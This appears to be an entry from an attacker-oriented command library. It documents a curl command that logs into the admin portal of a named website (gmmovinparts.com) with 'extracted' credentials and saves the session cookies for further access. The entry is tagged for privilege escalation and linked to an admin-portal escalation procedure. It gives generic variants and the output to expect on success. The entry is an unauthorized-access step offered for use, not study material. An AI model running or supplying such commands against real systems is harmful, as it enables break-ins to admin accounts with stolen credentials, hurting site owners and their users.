---
id: cmd-uuid-005
data: >-
  curl -X POST https://gmmovinparts.com/admin/login.jsp -d
  "username=admin&password=extracted_hash" -c cookies.txt -v
tags:
  - auth
  - web
  - escalation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.481Z'
verified: false
validated: true
submitted: true
---
# curl-admin-login

## Command

```bash
curl -X POST https://gmmovinparts.com/admin/login.jsp -d "username=admin&password=extracted_hash" -c cookies.txt -v
```

## Description

Attempts login to an admin portal using extracted credentials, capturing session cookies for further access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Method | Yes |
| `-d` | Login data | Yes |
| `-c cookies.txt` | Save cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/admin -d "user=admin&pass=pass" -c cookies.txt
```

### Advanced Usage

```bash
curl -X POST https://target.com/admin -d "username=admin&password=pass" -b cookies.txt -c cookies.txt
```

## Expected Output

Set-Cookie header with session ID or 302 redirect to dashboard.

## Related

- [[Related Procedure: Escalate-to-Admin-Portal-Access]]
